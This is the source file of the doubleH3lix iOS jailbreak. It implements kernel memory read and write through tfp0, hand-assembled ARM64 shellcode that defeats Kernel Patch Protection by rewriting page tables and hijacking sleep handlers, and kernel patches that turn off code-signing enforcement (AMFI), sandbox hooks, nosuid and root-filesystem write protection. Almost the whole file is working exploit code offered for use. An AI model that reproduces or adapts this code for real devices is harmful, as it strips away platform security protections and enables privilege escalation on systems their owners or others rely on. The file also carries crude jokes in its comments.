//
//  jailbreak.m
//  doubleH3lix
//
//  Created by tihmstar on 18.02.18.
//  Copyright © 2018 tihmstar. All rights reserved.
//

extern "C"{
#include <stdio.h>
#include <stdint.h>

#include "common.h"

#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror
#include <unistd.h>             // usleep, setuid, getuid
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>
#include "offsets.h"

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);

#define ReadAnywhere32 kread_uint32
#define WriteAnywhere32 kwrite_uint32
#define ReadAnywhere64 kread_uint64
#define WriteAnywhere64 kwrite_uint64


kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
#define copyin(to, from, size) kread(from, to, size)
#define copyout(to, from, size) kwrite(to, from, size)

#include <sys/utsname.h>
#include <sys/mount.h>
#include <spawn.h>
#include <sys/stat.h>
#include <copyfile.h>
extern int (*dsystem)(const char *);
#include "pte_stuff.h"
#include "sbops.h"
}
#include <vector>
#include <liboffsetfinder64/liboffsetfinder64.hpp>

#define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]

#define KBASE 0xfffffff007004000
mach_port_t tfp0 = 0;

void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi);


size_t kread(uint64_t where, void *p, size_t size){
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint64_t kread_uint64(uint64_t where){
    uint64_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

uint32_t kread_uint32(uint64_t where){
    uint32_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

size_t kwrite(uint64_t where, const void *p, size_t size){
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

size_t kwrite_uint64(uint64_t where, uint64_t value){
    return kwrite(where, &value, sizeof(value));
}

size_t kwrite_uint32(uint64_t where, uint32_t value){
    return kwrite(where, &value, sizeof(value));
}

uint64_t physalloc(uint64_t size) {
    uint64_t ret = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
    return ret;
}







// kpp pass
void kpp(uint64_t kernbase, uint64_t slide, tihmstar::offsetfinder64 *fi){

	
    postProgress(@"running KPP bypass");
    checkvad();

    uint64_t entryp;

    uint64_t gStoreBase = (uint64_t)fi->find_gPhysBase() + slide;

    gPhysBase = ReadAnywhere64(gStoreBase);
    gVirtBase = ReadAnywhere64(gStoreBase+8);

    entryp = (uint64_t)fi->find_entry() + slide;
    uint64_t rvbar = entryp & (~0xFFF);

    uint64_t cpul = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;

    uint64_t optr = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;

    NSLog(@"%llx", optr);

    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);

    uint64_t pmap_store = (uint64_t)fi->find_kernel_pmap() + slide;
    NSLog(@"pmap: %llx", pmap_store);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));




    uint64_t shellcode = physalloc(0x4000);

    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */

    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);

    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);

    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);

    uint64_t physcode = findphys_real(shellcode);

    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);

    uint64_t idlesleep_handler = 0;

    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;

    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            NSLog(@"already jailbroken, bailing out");
            return;
        }


        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler

            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;


            uint32_t* opcz = (uint32_t*)malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }


        }

        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);

        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }


    uint64_t shc = physalloc(0x4000);

    uint64_t regi = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
    uint64_t regd = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;

    NSLog(@"%llx - %llx", regi, regd);

    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);
    }

    /*
     isvad 0 == 0x4000
     */

    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);

    uint64_t ttbr0_real = fi->find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;

    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);

    char* bbuf = (char*)malloc(0x4000);
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);

    uint64_t physp = findphys_real(level0_pte);


    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);

    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        int n = 0;
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str        w8, [x23]
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov     x0, xzr
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0

    }

    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    mach_vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;

        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr    x1, #60
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr    x0, #40
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr    TTBR1_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz    x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr    CPACR_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr    TTBR1_EL1, x1
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr    x0, #-4
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }

    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle

    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler

    /*

     pagetables are now not real anymore, they're real af

     */

    uint64_t cpacr_addr = (uint64_t)fi->find_cpacr_write() + slide;
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)


#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
uint64_t tte = ReadAnywhere64(tte_addr);\
if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
NSLog(@"breakup!");\
uint64_t fakep = physalloc(PSZ);\
uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
TTE_SETB(tte, TTE_IS_TABLE_MASK);\
for (int i = 0; i < PSZ/8; i++) {\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
WriteAnywhere64(fakep+i*8, tte);\
}\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
WriteAnywhere64(tte_addr, tte);\
}\
uint64_t newt = physalloc(PSZ);\
copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
copyout(newt, bbuf, PSZ);\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
WriteAnywhere64(tte_addr, tte);\
}, level1_table, isvad ? 1 : 2);

#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)

    uint64_t* remappage = (uint64_t*)calloc(512, 8);

    int remapcnt = 0;


#define RemapPage(x)\
{\
int fail = 0;\
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
if (fail == 0) {\
RemapPage_(x);\
RemapPage_(x+PSZ);\
remappage[remapcnt++] = (x & (~PMK));\
}\
}

    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);


    uint64_t shtramp = kernbase + ((const struct mach_header *)fi->kdata())->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(cpacr_addr);
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));

    RemapPage(shtramp);
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);


    WriteAnywhere64((uint64_t)fi->find_idlesleep_str_loc()+slide, physcode+0x100);
    WriteAnywhere64((uint64_t)fi->find_deepsleep_str_loc()+slide, physcode+0x200);


    //kernelpatches
    postProgress(@"patching kernel");

    std::vector<tihmstar::patchfinder64::patch> kernelpatches;
    kernelpatches.push_back(fi->find_i_can_has_debugger_patch_off());

    std::vector<tihmstar::patchfinder64::patch> nosuid = fi->find_nosuid_off();

    kernelpatches.push_back(fi->find_remount_patch_offset());
    kernelpatches.push_back(fi->find_lwvm_patch_offsets());
    kernelpatches.push_back(nosuid.at(0));
    kernelpatches.push_back(nosuid.at(1));
    kernelpatches.push_back(fi->find_proc_enforce());
    kernelpatches.push_back(fi->find_amfi_patch_offsets());
    kernelpatches.push_back(fi->find_cs_enforcement_disable_amfi());
    kernelpatches.push_back(fi->find_amfi_substrate_patch());
    kernelpatches.push_back(fi->find_nonceEnabler_patch());

    try {
        kernelpatches.push_back(fi->find_sandbox_patch());
    } catch (tihmstar::exception &e) {
        NSLog(@"WARNING: failed to find sandbox_patch! Assuming we're on x<10.3 and continueing anyways!");
    }


    auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
        patch.slide(slide);
        NSString * str = @"patching at: %p [";
        for (int i=0; i<patch._patchSize; i++) {
            str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
        }
        NSLog([str stringByAppendingString:@"]"],patch._location);
        RemapPage((uint64_t)(patch._location+slide));
        for (size_t i=0; i<patch._patchSize;i+=4) {
            int diff = (int)(patch._patchSize-i);
            if (diff >=8){
                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), *(uint64_t*)((uint8_t*)patch._patch+i));
            }else{
                uint64_t p = ReadAnywhere64((uint64_t)patch._location+slide+i);
                p &= ~(((uint64_t)1<<(8*diff))-1);
                p |= ((*(uint64_t*)((uint8_t*)patch._patch+i)) % ((uint64_t)1<<(8*diff)));
                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), p);
            }
        }
    };


    for (auto patch : kernelpatches){
        dopatch(patch);
    }

    postProgress(@"patching sandbox");
    uint64_t sbops = (uint64_t)fi->find_sbops()+slide;
    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;

    uint64_t nopag = (sbops_end - sbops)/(PSZ);

    for (int i = 0; i < nopag; i++) {
        RemapPage(((sbops + i*(PSZ)) & (~PMK)));
    }

    printf("Found sbops 0x%llx\n",sbops);

    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);

    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);

    uint64_t marijuanoff = (uint64_t)fi->memmem("RELEASE_ARM",sizeof("RELEASE_ARM")-1)+slide;

    // smoke trees
    RemapPage(marijuanoff);
    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)"Marijuan");

    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }

    //check for i_can_has_debugger
    while (ReadAnywhere32((uint64_t)kernelpatches.at(0)._location+slide) != 1) {
        sleep(1);
    }

    char* nm = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", 0x10000, &nm);
    printf("Mount succeeded? %d\n",mntr);

    if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
        printf("write test success!\n");
        remove("/v0rtex");
    }else
        printf("[!] write test failed!\n");


    NSLog(@"enabled patches");
}

int kpp_init(uint64_t kernbase, uint64_t slide)
{
	tihmstar::offsetfinder64 fi("/tmp/kernelcache-decrypt");
	offsets_t *off = NULL;
	off = get_offsets(&fi);
	kpp(kernbase, slide, &fi);
	
	return 0;
}

